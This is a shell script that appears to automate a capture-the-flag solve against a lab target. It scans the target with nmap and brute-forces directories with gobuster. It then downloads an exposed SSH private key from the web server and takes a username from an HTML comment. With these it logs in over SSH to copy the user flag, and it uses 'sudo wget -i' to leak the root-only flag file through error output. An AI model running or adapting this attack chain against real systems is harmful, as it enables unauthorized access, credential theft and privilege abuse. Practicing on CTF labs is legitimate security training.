#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define target IP ( the machine to attack ) and attack IP ( the machine which supports the attack )
target_ip="10.10.63.162"
attack_ip="10.6.45.13"
result_folder="/media/psf/Home/Work/results/"

# Prepare environment
mkdir $result_folder 2>/dev/null


echo "1 - RECONNAISSANCE"
nmap -p- -Pn -sC -sV -A -sS -T4 ${target_ip} > $result_folder/nmap-results.txt
gobuster dir -u http://$target_ip -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,sh,txt,cgi,jpg,png,html,js,css,py -o $result_folder/gobuster-results.txt
gobuster dir -u http://$target_ip/sitemap/ -t 200 -w /usr/share/wordlists/dirb/big.txt -x php,sh,txt,cgi,jpg,png,html,js,css,py -o $result_folder/sitemap-results.txt

echo "2 - INTRUSION"
curl -s -X GET http://$target_ip > $result_folder/user.html
curl -s -X GET http://$target_ip/sitemap/.ssh/id_rsa > $result_folder/id_rsa
TEXT=$(cat $result_folder/user.html | sed -n 's/.*<!-- \(.*\) don.*/\1/p')
USER=$(echo "$TEXT" | tr 'A-Z' 'a-z')
echo "--> User is '$USER'"
chmod 600 $result_folder/id_rsa
scp -o StrictHostKeyChecking=no -i $result_folder/id_rsa $USER@$target_ip:Documents/user_flag.txt $result_folder/user_flag.txt
FLAG=$(cat $result_folder/user_flag.txt)
echo "--> User flag is '$FLAG'"

echo "3 - PRIVILEGE ESCALATION"
ssh -o StrictHostKeyChecking=no -i $result_folder/id_rsa $USER@$target_ip "sudo wget -i /root/root_flag.txt" 2> $result_folder/root.txt
FLAG=$(cat $result_folder/root.txt | sed -n 's/.*Resolving \(.*\) (.*/\1/p')
echo "--> Root flag is '$FLAG'"
